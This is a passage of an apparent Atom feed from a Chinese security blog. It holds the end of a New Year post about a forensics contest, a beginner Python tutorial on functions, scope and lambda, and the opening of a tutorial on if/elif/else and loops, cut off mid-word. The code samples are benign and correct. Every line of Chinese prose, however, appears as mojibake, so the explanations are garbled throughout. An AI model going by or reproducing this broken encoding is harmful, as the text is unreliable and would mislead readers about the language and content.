/><p>ä¹Ÿéå¸¸æ„Ÿè°¢è€å¸ˆåœ¨è¿™æ¬¡æ¯”èµ›ä¸­ç»™çš„å¸®åŠ©ï¼Œå’±æ€¥éœ€ç¡¬ç›˜çš„æ—¶å€™ï¼Œè€å¸ˆç›´æ¥ç»™é€æ¥äº†ç¬”è®°æœ¬ï¼Œä¿è¯èƒ½äººæ‰‹ä¸€ä¸ªæ¯”èµ›è®¾å¤‡ï¼Œè™½ç„¶æœ€åæ£€ææ²¡é¢„æœŸé‚£ä¹ˆå¤§ã€‚</p><p>å¼€èµ›å½“å¤©çœŸçš„æ˜¯ä¸€å¤´é›¾æ°´ï¼Œè§£å‹å¯†ç è¢«&lt;&gt;ç»™é—­åˆäº†ï¼Œå‰åŠä¸ªå°æ—¶å¿ƒæ€ä¸å¤ªå¥½ï¼Œç»“æœæ‰“å®Œèµ„æ ¼èµ›ç»“æœå‡ºä¹æ„æ–™çš„ä¸é”™ã€‚</p><p>æœ‰äº†èµ„æ ¼èµ›çš„ä¿¡å¿ƒï¼Œå›¢é˜Ÿèµ›æ‰“çš„ç›¸å¯¹æ›´åŠ è‡ªä¿¡ï¼Œä¹Ÿæ›´æœ‰å¼ åŠ›ã€‚</p><p>æœ€åé‘«ç¼˜ç«Ÿç„¶æ‹¿äº†èµ„æ ¼èµ›ä¸€ç­‰å¥–ï¼ˆå±å®å‡ºä¹æ„æ–™ï¼Œä¹‹å‰æ¥è§¦å–è¯ä¸å¤šï¼‰ï¼Œç©¹é•œå‚åŠ çš„ä¸¤æ”¯é˜Ÿéƒ½æ‹¿åˆ°äº†ä¸€ç­‰å¥–ã€‚</p><h2 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h2><p>ç»§ç»­åšæŒèµ°è‡ªå·±çš„è·¯ï¼Œæ˜å¹´çš„å…ƒæ—¦ï¼Œå¯èƒ½å·²ç»è¦å¼€å§‹å‡†å¤‡è€ƒç ”äº†ï¼Œæ˜å¹´ä¹Ÿè¦æ…¢æ…¢æ‰©å……ç©¹é•œåœ¨å„ä¸ªå®‰å…¨æ–¹å‘çš„äººå‘˜ï¼Œä¹Ÿæ›´å¸Œæœ›èƒ½å¤Ÿæƒ³åŠ å…¥æˆ‘ä»¬ä¸€èµ·ç©å®‰å…¨çš„å¥½å…„å¼Ÿã€‚</p><p>åœ¨åšå®‰å…¨çš„è¿™æ¡è·¯ä¸Šï¼Œä¸ç©è™šçš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–°å¹´å¿«ä¹&quot;&gt;&lt;a href=&quot;#æ–°å¹´å¿«ä¹&quot; class=&quot;headerlink&quot; title=&quot;æ–°å¹´å¿«ä¹&quot;&gt;&lt;/a&gt;æ–°å¹´å¿«ä¹&lt;/h1&gt;&lt;p&gt;æ–°çš„ä¸€å¹´ï¼Œæ›´åŠ åŠªåŠ›ä¸åšæŒï¼Œæ›´åŠ çµæ´»ï¼Œä¸æ–­å‘å‰ï¼ŒåŠ æ²¹å§ï¼&lt;/p&gt;
&lt;p&gt;ä»Šå¹´æ˜¯æˆ‘åœ¨å®‰å…¨é¢†åŸŸçš„ç¬¬ä¸€å¹´ï¼Œå›æƒ³è¿‡å»ä¸€å¹´æ‰€ç»å†çš„æ¯”èµ›ï¼Œ</summary>
      
    
    
    
    <category term="é—²èŠ" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="é—²èŠ" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>pythonåŸºç¡€å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨</title>
    <link href="http://websec.space/2021/12/21/python%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://websec.space/2021/12/21/python%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2021-12-20T16:00:00.000Z</published>
    <updated>2021-12-20T06:51:27.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨"><a href="#å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨"></a>å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨</h1><h3 id="å‡½æ•°çš„å®šä¹‰"><a href="#å‡½æ•°çš„å®šä¹‰" class="headerlink" title="å‡½æ•°çš„å®šä¹‰"></a>å‡½æ•°çš„å®šä¹‰</h3><p>å‡½æ•°æ˜¯ä¸€æ®µå…·æœ‰ç‰¹å®šåŠŸèƒ½çš„ã€å¯é‡ç”¨çš„è¯­å¥ç»„ï¼Œç”¨å‡½æ•°åæ¥è¡¨ç¤ºå¹¶é€šè¿‡å‡½æ•°åè¿›è¡Œå®ŒæˆåŠŸèƒ½è°ƒç”¨ã€‚</p><p>å‡½æ•°ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯ä¸€æ®µå…·æœ‰åå­—çš„å­ç¨‹åºï¼Œå¯ä»¥åœ¨éœ€è¦çš„åœ°æ–¹è°ƒç”¨æ‰§è¡Œï¼Œä¸éœ€è¦åœ¨æ¯ä¸ªæ‰§è¡Œåœ°æ–¹é‡å¤ç¼–å†™è¿™äº›è¯­å¥ã€‚æ¯æ¬¡ä½¿ç”¨å‡½æ•°å¯ä»¥æä¾›ä¸åŒçš„å‚æ•°ä½œä¸ºè¾“å…¥ï¼Œä»¥å®ç°å¯¹ä¸åŒæ•°æ®çš„å¤„ç†ï¼›å‡½æ•°æ‰§è¡Œåï¼Œè¿˜å¯ä»¥åé¦ˆç›¸åº”çš„å¤„ç†ç»“æœã€‚</p><p>Pythonå®šä¹‰ä¸€ä¸ªå‡½æ•°ä½¿ç”¨defä¿ç•™å­—ï¼Œè¯­æ³•å½¢å¼å¦‚ä¸‹ï¼š</p><p>def &lt;å‡½æ•°å&gt;(&lt;å‚æ•°åˆ—è¡¨&gt;):</p><p>â€‹    &lt;å‡½æ•°ä½“&gt;</p><p>â€‹    return &lt;è¿”å›å€¼åˆ—è¡¨&gt;</p><p>ç¨‹åºè°ƒç”¨ä¸€ä¸ªå‡½æ•°éœ€è¦æ‰§è¡Œä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><p>ï¼ˆ1ï¼‰è°ƒç”¨ç¨‹åºåœ¨è°ƒç”¨å¤„æš‚åœæ‰§è¡Œï¼›</p><p>ï¼ˆ2ï¼‰åœ¨è°ƒç”¨æ—¶å°†å®å‚å¤åˆ¶ç»™å‡½æ•°çš„å½¢å‚ï¼›</p><p>ï¼ˆ3ï¼‰æ‰§è¡Œå‡½æ•°ä½“è¯­å¥ï¼›</p><p>ï¼ˆ4ï¼‰å‡½æ•°è°ƒç”¨ç»“æŸç»™å‡ºè¿”å›å€¼ï¼Œç¨‹åºå›åˆ°è°ƒç”¨å‰çš„æš‚åœå¤„ç»§ç»­æ‰§è¡Œã€‚</p><h3 id="lambdaå‡½æ•°"><a href="#lambdaå‡½æ•°" class="headerlink" title="lambdaå‡½æ•°"></a>lambdaå‡½æ•°</h3><p>åŒ¿åå‡½æ•°ï¼Œåˆç§°lambdaå‡½æ•°ã€‚</p><p>åŒ¿åå‡½æ•°å¹¶éæ²¡æœ‰åå­—ï¼Œè€Œæ˜¯å°†å‡½æ•°åä½œä¸ºå‡½æ•°ç»“æœè¿”å›</p><p>&lt;å‡½æ•°å&gt; = lambda &lt;å‚æ•°åˆ—è¡¨&gt;: &lt;è¡¨è¾¾å¼&gt;</p><p>lambdaå‡½æ•°ä¸æ­£å¸¸å‡½æ•°ä¸€æ ·ï¼Œç­‰ä»·äºä¸‹é¢å½¢å¼ï¼š</p><p>def &lt;å‡½æ•°å&gt;(&lt;å‚æ•°åˆ—è¡¨&gt;):</p><p>â€‹    return &lt;è¡¨è¾¾å¼&gt;</p><p>ç®€å•è¯´ï¼Œlambdaå‡½æ•°ç”¨äºå®šä¹‰ç®€å•çš„ã€èƒ½å¤Ÿåœ¨ä¸€è¡Œå†…è¡¨ç¤ºçš„å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªå‡½æ•°ç±»å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;f = <span class="keyword">lambda</span> x, y : x + y</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">type</span>(f)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">function</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;<span class="title">f</span>(<span class="params"><span class="number">10</span>, <span class="number">12</span></span>)</span></span><br><span class="line"><span class="class">22</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°çš„å‚æ•°ä¼ é€’"><a href="#å‡½æ•°çš„å‚æ•°ä¼ é€’" class="headerlink" title="å‡½æ•°çš„å‚æ•°ä¼ é€’"></a>å‡½æ•°çš„å‚æ•°ä¼ é€’</h3><p>å¯é€‰å‚æ•°å’Œå¯å˜æ•°é‡å‚æ•°</p><p>åœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œæœ‰äº›å‚æ•°å¯ä»¥å­˜åœ¨é»˜è®¤å€¼</p><p>ç”±äºå‡½æ•°è°ƒç”¨æ—¶éœ€è¦æŒ‰é¡ºåºè¾“å…¥å‚æ•°ï¼Œå¯é€‰å‚æ•°å¿…é¡»å®šä¹‰åœ¨ éå¯é€‰å‚æ•°çš„åé¢ã€‚å³dupå‡½æ•°ä¸­å¸¦é»˜è®¤å€¼çš„å¯é€‰å‚æ•°timeså¿…é¡»å®šä¹‰åœ¨strå‚æ•°åé¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">dup</span>(<span class="params"><span class="built_in">str</span>, times = <span class="number">2</span></span>):</span></span><br><span class="line">       <span class="built_in">print</span>(<span class="built_in">str</span>*times)</span><br><span class="line">&gt;&gt;&gt;dup(<span class="string">&quot;knock~&quot;</span>)</span><br><span class="line">knock~knock~</span><br><span class="line">&gt;&gt;&gt;dup(<span class="string">&quot;knock~&quot;</span>,<span class="number">4</span>)</span><br><span class="line">knock~knock~knock~knock~</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°å®šä¹‰æ—¶ï¼Œå¯ä»¥è®¾è®¡å¯å˜æ•°é‡å‚æ•°ï¼Œé€šè¿‡å‚æ•°å‰å¢åŠ æ˜Ÿå·ï¼ˆ*ï¼‰å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">vfunc</span>(<span class="params">a, *b</span>):</span></span><br><span class="line">       <span class="built_in">print</span>(<span class="built_in">type</span>(b))</span><br><span class="line">       <span class="keyword">for</span> n <span class="keyword">in</span> b:</span><br><span class="line">           a += n</span><br><span class="line">       <span class="keyword">return</span> a</span><br><span class="line">&gt;&gt;&gt;vfunc(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">15</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><h4 id="å‚æ•°çš„ä½ç½®å’Œåç§°ä¼ é€’"><a href="#å‚æ•°çš„ä½ç½®å’Œåç§°ä¼ é€’" class="headerlink" title="å‚æ•°çš„ä½ç½®å’Œåç§°ä¼ é€’"></a>å‚æ•°çš„ä½ç½®å’Œåç§°ä¼ é€’</h4><p>å‚æ•°è¾ƒå¤šæ—¶ï¼Œé‡‡ç”¨æŒ‰ç…§ä½ç½®é¡ºåºçš„æ–¹å¼ä¼ é€’ç»™å‚æ•°ï¼Œå¯è¯»æ€§è¾ƒå·®</p><p>å‡è®¾func()å‡½æ•°æœ‰6ä¸ªå‚æ•°ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><p>func(x1, y1, z1, x2, y2, z2)</p><p>â€‹    return</p><p>è°ƒç”¨  </p><p>Result = func(1, 2, 3, 4, 5, 6)</p><p>å¦‚æœä»…çœ‹å®é™…è°ƒç”¨è€Œä¸çœ‹å‡½æ•°å®šä¹‰ï¼Œå¾ˆéš¾ç†è§£è¿™äº›è¾“å…¥å‚æ•°çš„å«ä¹‰</p><p>Pythonæä¾›äº†æŒ‰ç…§å½¢å‚åç§°è¾“å…¥å®å‚çš„æ–¹å¼ï¼Œè°ƒç”¨å¦‚ä¸‹ï¼š</p><p>result = func(x2=4, y2=5, z2=6, x1=1, y1=2, z1=3)</p><p>ç”±äºè°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šäº†å‚æ•°åç§°ï¼Œæ‰€ä»¥å‚æ•°ä¹‹é—´çš„é¡ºåºå¯ä»¥ä»»æ„è°ƒæ•´</p><h3 id="å˜é‡çš„è¿”å›å€¼"><a href="#å˜é‡çš„è¿”å›å€¼" class="headerlink" title="å˜é‡çš„è¿”å›å€¼"></a>å˜é‡çš„è¿”å›å€¼</h3><p>returnè¯­å¥ç”¨æ¥é€€å‡ºå‡½æ•°å¹¶å°†ç¨‹åºè¿”å›åˆ°å‡½æ•°è¢«è°ƒç”¨çš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p><p>returnè¯­å¥åŒæ—¶å¯ä»¥å°†0ä¸ªã€1ä¸ªæˆ–å¤šä¸ªå‡½æ•°è¿ç®—å®Œçš„ç»“æœè¿”å›ç»™å‡½æ•°è¢«è°ƒç”¨å¤„çš„å˜é‡ã€‚</p><p>å‡½æ•°ä¹Ÿå¯ä»¥ç”¨returnè¿”å›å¤šä¸ªå€¼ï¼Œå¤šä¸ªå€¼ä»¥å…ƒç»„ç±»å‹ä¿å­˜</p><h4 id="å‡½æ•°å¯¹å˜é‡çš„ä½œç”¨"><a href="#å‡½æ•°å¯¹å˜é‡çš„ä½œç”¨" class="headerlink" title="å‡½æ•°å¯¹å˜é‡çš„ä½œç”¨"></a>å‡½æ•°å¯¹å˜é‡çš„ä½œç”¨</h4><p>ä¸€ä¸ªç¨‹åºä¸­çš„å˜é‡åŒ…æ‹¬ä¸¤ç±»ï¼šå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ã€‚</p><p>å…¨å±€å˜é‡æŒ‡åœ¨å‡½æ•°ä¹‹å¤–å®šä¹‰çš„å˜é‡ï¼Œä¸€èˆ¬æ²¡æœ‰ç¼©è¿›ï¼Œåœ¨ç¨‹åºæ‰§è¡Œå…¨è¿‡ç¨‹æœ‰æ•ˆã€‚</p><p>å±€éƒ¨å˜é‡æŒ‡åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„å˜é‡ï¼Œä»…åœ¨å‡½æ•°å†…éƒ¨æœ‰æ•ˆï¼Œå½“å‡½æ•°é€€å‡ºæ—¶å˜é‡å°†ä¸å­˜åœ¨ã€‚</p><p>å˜é‡çš„è¿”å›å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;n = <span class="number">1</span>    <span class="comment">#næ˜¯å…¨å±€å˜é‡</span></span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a, b</span>):</span></span><br><span class="line">       c = a * b     <span class="comment">#cæ˜¯å±€éƒ¨å˜é‡ï¼Œaå’Œbä½œä¸ºå‡½æ•°å‚æ•°ä¹Ÿæ˜¯å±€éƒ¨å˜é‡</span></span><br><span class="line">       <span class="keyword">return</span> c</span><br><span class="line">&gt;&gt;&gt;s = func(<span class="string">&quot;knock~&quot;</span>, <span class="number">2</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(c)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#6&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">NameError: name <span class="string">&#x27;c&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“å‡½æ•°æ‰§è¡Œå®Œé€€å‡ºåï¼Œå…¶å†…éƒ¨å˜é‡å°†è¢«é‡Šæ”¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;n = <span class="number">1</span>    <span class="comment">#næ˜¯å…¨å±€å˜é‡</span></span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a, b</span>):</span></span><br><span class="line">       n = b     <span class="comment">#è¿™ä¸ªnæ˜¯åœ¨å‡½æ•°å†…å­˜ä¸­æ–°ç”Ÿæˆçš„å±€éƒ¨å˜é‡ï¼Œä¸æ˜¯å…¨å±€å˜é‡ </span></span><br><span class="line">       <span class="keyword">return</span> a*b</span><br><span class="line">&gt;&gt;&gt;s = func(<span class="string">&quot;knock~&quot;</span>, <span class="number">2</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(s, n)  <span class="comment">#æµ‹è¯•ä¸€ä¸‹nå€¼æ˜¯å¦æ”¹å˜</span></span><br><span class="line">knock~knock~ <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;/a&gt;å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨&lt;/h1&gt;&lt;h3 id=&quot;å‡½æ•°çš„å®šä¹‰&quot;&gt;&lt;a href=&quot;#å‡½æ•°çš„å®šä¹‰&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="python" scheme="http://websec.space/categories/python/"/>
    
    
    <category term="python" scheme="http://websec.space/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pythonåŸºç¡€(äºŒ)</title>
    <link href="http://websec.space/2021/12/20/python%E5%9F%BA%E7%A1%80(%E4%BA%8C)/"/>
    <id>http://websec.space/2021/12/20/python%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</id>
    <published>2021-12-19T16:00:00.000Z</published>
    <updated>2022-01-07T15:49:21.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pythonåŸºç¡€-äºŒ"><a href="#pythonåŸºç¡€-äºŒ" class="headerlink" title="pythonåŸºç¡€(äºŒ)"></a>pythonåŸºç¡€(äºŒ)</h1><h2 id="ç¨‹åºçš„åŸºæœ¬ç»“æ„"><a href="#ç¨‹åºçš„åŸºæœ¬ç»“æ„" class="headerlink" title="ç¨‹åºçš„åŸºæœ¬ç»“æ„"></a>ç¨‹åºçš„åŸºæœ¬ç»“æ„</h2><p>ç¨‹åºæµç¨‹å›¾ç”¨ä¸€ç³»åˆ—å›¾å½¢ã€æµç¨‹çº¿å’Œæ–‡å­—è¯´æ˜æè¿°ç¨‹åºçš„åŸºæœ¬æ“ä½œå’Œæ§åˆ¶æµç¨‹ï¼Œå®ƒæ˜¯ç¨‹åºåˆ†æå’Œè¿‡ç¨‹æè¿°çš„æœ€åŸºæœ¬æ–¹å¼ã€‚</p><p><img src="https://img-blog.csdnimg.cn/2d0deb534583469d972936b39e4a3f4d.png" alt="img"></p><p>ç¨‹åºç”±ä¸‰ç§åŸºæœ¬ç»“æ„ç»„æˆï¼š</p><p>é¡ºåºç»“æ„</p><p>åˆ†æ”¯ç»“æ„</p><p>å¾ªç¯ç»“æ„</p><p>è¿™äº›åŸºæœ¬ç»“æ„éƒ½æœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ã€‚ä»»ä½•ç¨‹åºéƒ½ç”±è¿™ä¸‰ç§åŸºæœ¬ç»“æ„ç»„åˆè€Œæˆ</p><blockquote><p>é¡ºåºç»“æ„æ˜¯ç¨‹åºæŒ‰ç…§çº¿æ€§é¡ºåºä¾æ¬¡æ‰§è¡Œçš„ä¸€ç§è¿è¡Œæ–¹å¼ï¼Œå…¶ä¸­è¯­å¥å—1å’Œè¯­å¥å—2è¡¨ç¤ºä¸€ä¸ªæˆ–ä¸€ç»„é¡ºåºæ‰§è¡Œçš„è¯­å¥ </p><p>åˆ†æ”¯ç»“æ„æ˜¯ç¨‹åºæ ¹æ®æ¡ä»¶åˆ¤æ–­ç»“æœè€Œé€‰æ‹©ä¸åŒå‘å‰æ‰§è¡Œè·¯å¾„çš„ä¸€ç§è¿è¡Œæ–¹å¼ï¼ŒåŒ…æ‹¬å•åˆ†æ”¯ç»“æ„å’ŒäºŒåˆ†æ”¯ç»“æ„ã€‚ç”±äºŒåˆ†æ”¯ç»“æ„ä¼šç»„åˆå½¢æˆå¤šåˆ†æ”¯ç»“æ„</p><p>å¾ªç¯ç»“æ„æ˜¯ç¨‹åºæ ¹æ®æ¡ä»¶åˆ¤æ–­ç»“æœå‘ååå¤æ‰§è¡Œçš„ä¸€ç§è¿è¡Œæ–¹å¼ï¼Œæ ¹æ®å¾ªç¯ä½“è§¦å‘æ¡ä»¶ä¸åŒï¼ŒåŒ…æ‹¬æ¡ä»¶å¾ªç¯å’Œéå†å¾ªç¯ç»“æ„</p></blockquote><h2 id="ç¨‹åºçš„åˆ†æ”¯ç»“æ„"><a href="#ç¨‹åºçš„åˆ†æ”¯ç»“æ„" class="headerlink" title="ç¨‹åºçš„åˆ†æ”¯ç»“æ„"></a>ç¨‹åºçš„åˆ†æ”¯ç»“æ„</h2><p>Pythonä¸­ifè¯­å¥çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>if &lt;æ¡ä»¶&gt;:</p><p>  è¯­å¥å—</p><p>è¯­å¥å—æ˜¯ifæ¡ä»¶æ»¡è¶³åæ‰§è¡Œçš„ä¸€ä¸ªæˆ–å¤šä¸ªè¯­å¥åºåˆ—</p><p>è¯­å¥å—ä¸­è¯­å¥é€šè¿‡ä¸ifæ‰€åœ¨è¡Œå½¢æˆç¼©è¿›è¡¨è¾¾åŒ…å«å…³ç³»</p><p>ifè¯­å¥é¦–å…ˆè¯„ä¼°&lt;æ¡ä»¶&gt;çš„ç»“æœå€¼ï¼Œå¦‚æœç»“æœä¸ºTrueï¼Œåˆ™æ‰§è¡Œè¯­å¥å—é‡Œçš„è¯­å¥åºåˆ—ï¼Œç„¶åæ§åˆ¶è½¬å‘ç¨‹åºçš„ä¸‹ä¸€æ¡è¯­å¥ã€‚å¦‚æœç»“æœä¸ºFalseï¼Œè¯­å¥å—é‡Œçš„è¯­å¥ä¼šè¢«è·³è¿‡ã€‚ </p><h3 id="å•åˆ†æ”¯è¯­å¥"><a href="#å•åˆ†æ”¯è¯­å¥" class="headerlink" title="å•åˆ†æ”¯è¯­å¥"></a>å•åˆ†æ”¯è¯­å¥</h3><p>ifè¯­å¥ä¸­è¯­å¥å—æ‰§è¡Œä¸å¦ä¾èµ–äºæ¡ä»¶åˆ¤æ–­ã€‚ä½†æ— è®ºä»€ä¹ˆæƒ…å†µï¼Œæ§åˆ¶éƒ½ä¼šè½¬åˆ°ifè¯­å¥åä¸è¯¥è¯­å¥åŒçº§åˆ«çš„ä¸‹ä¸€æ¡è¯­å¥ </p><p>ifè¯­å¥ä¸­&lt;æ¡ä»¶&gt;éƒ¨åˆ†å¯ä»¥ä½¿ç”¨ä»»ä½•èƒ½å¤Ÿäº§ç”ŸTrueæˆ–Falseçš„è¯­å¥</p><p>å½¢æˆåˆ¤æ–­æ¡ä»¶æœ€å¸¸è§çš„æ–¹å¼æ˜¯é‡‡ç”¨å…³ç³»æ“ä½œç¬¦</p><table><thead><tr><th>æ“ä½œç¬¦</th><th>æ•°å­¦ç¬¦å·</th><th>æ“ä½œç¬¦å«ä¹‰</th></tr></thead><tbody><tr><td><em>&lt;</em></td><td><em>&lt;</em></td><td>å°äº</td></tr><tr><td><em>&lt;=</em></td><td><em>â‰¤</em></td><td>å°äºç­‰äº</td></tr><tr><td><em>&gt;=</em></td><td><em>â‰¥</em></td><td>å¤§äºç­‰äº</td></tr><tr><td><em>&gt;</em></td><td><em>&gt;</em></td><td>å¤§äº</td></tr><tr><td><em>==</em></td><td><em>=</em></td><td>ç­‰äº</td></tr><tr><td>!<em>=</em></td><td></td><td>ä¸ç­‰äº</td></tr></tbody></table><p>äºŒåˆ†æ”¯ç»“æ„: if-elseè¯­å¥</p><p>Pythonä¸­if-elseè¯­å¥ç”¨æ¥å½¢æˆäºŒåˆ†æ”¯ç»“æ„ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>if &lt;æ¡ä»¶&gt;:</p><p>  &lt;è¯­å¥å—1&gt;</p><p>else:</p><p>  &lt;è¯­å¥å—2&gt;</p><p>&lt;è¯­å¥å—1&gt;æ˜¯åœ¨ifæ¡ä»¶æ»¡è¶³åæ‰§è¡Œçš„ä¸€ä¸ªæˆ–å¤šä¸ªè¯­å¥åºåˆ—</p><p>&lt;è¯­å¥å—2&gt;æ˜¯ifæ¡ä»¶ä¸æ»¡è¶³åæ‰§è¡Œçš„è¯­å¥åºåˆ—</p><p>äºŒåˆ†æ”¯è¯­å¥ç”¨äºåŒºåˆ†&lt;æ¡ä»¶&gt;çš„ä¸¤ç§å¯èƒ½Trueæˆ–è€…Falseï¼Œåˆ†åˆ«å½¢æˆæ‰§è¡Œè·¯å¾„</p><blockquote><p>äºŒåˆ†æ”¯ç»“æ„è¿˜æœ‰ä¸€ç§æ›´ç®€æ´çš„è¡¨è¾¾æ–¹å¼ï¼Œé€‚åˆé€šè¿‡åˆ¤æ–­è¿”å›ç‰¹å®šå€¼ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>&lt;è¡¨è¾¾å¼1&gt; if &lt;æ¡ä»¶&gt; else &lt;è¡¨è¾¾å¼2&gt;</p></blockquote><h3 id="å¤šåˆ†æ”¯ç»“æ„-if-elif-elseè¯­å¥"><a href="#å¤šåˆ†æ”¯ç»“æ„-if-elif-elseè¯­å¥" class="headerlink" title="å¤šåˆ†æ”¯ç»“æ„: if-elif-elseè¯­å¥"></a>å¤šåˆ†æ”¯ç»“æ„: if-elif-elseè¯­å¥</h3><p>Pythonçš„if-elif-elseæè¿°å¤šåˆ†æ”¯ç»“æ„ï¼Œè¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š</p><p>if &lt;æ¡ä»¶1&gt;:</p><p>â€‹    &lt;è¯­å¥å—1&gt;</p><p>elif &lt;æ¡ä»¶2&gt;:</p><p>â€‹    &lt;è¯­å¥å—2&gt;</p><p>â€¦ </p><p>else: </p><p>â€‹    &lt;è¯­å¥å—N&gt;</p><p>å¤šåˆ†æ”¯ç»“æ„æ˜¯äºŒåˆ†æ”¯ç»“æ„çš„æ‰©å±•ï¼Œè¿™ç§å½¢å¼é€šå¸¸ç”¨äºè®¾ç½®åŒä¸€ä¸ªåˆ¤æ–­æ¡ä»¶çš„å¤šæ¡æ‰§è¡Œè·¯å¾„ã€‚</p><p>Pythonä¾æ¬¡è¯„ä¼°å¯»æ‰¾ç¬¬ä¸€ä¸ªç»“æœä¸ºTrueçš„æ¡ä»¶ï¼Œæ‰§è¡Œè¯¥æ¡ä»¶ä¸‹çš„è¯­å¥å—ï¼ŒåŒæ—¶ç»“æŸåè·³è¿‡æ•´ä¸ªif-elif-elseç»“æ„ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•æ¡ä»¶æˆç«‹ï¼Œelseä¸‹é¢çš„è¯­å¥å—è¢«æ‰§è¡Œã€‚elseå­å¥æ˜¯å¯é€‰çš„ </p><h2 id="ç¨‹åºçš„å¾ªç¯ç»“æ„"><a href="#ç¨‹åºçš„å¾ªç¯ç»“æ„" class="headerlink" title="ç¨‹åºçš„å¾ªç¯ç»“æ„"></a>ç¨‹åºçš„å¾ªç¯ç»“æ„</h2><h3 id="éå†å¾ªç¯"><a href="#éå†å¾ªç¯" class="headerlink" title="éå†å¾ªç¯"></a>éå†å¾ªç¯</h3><p>  æ 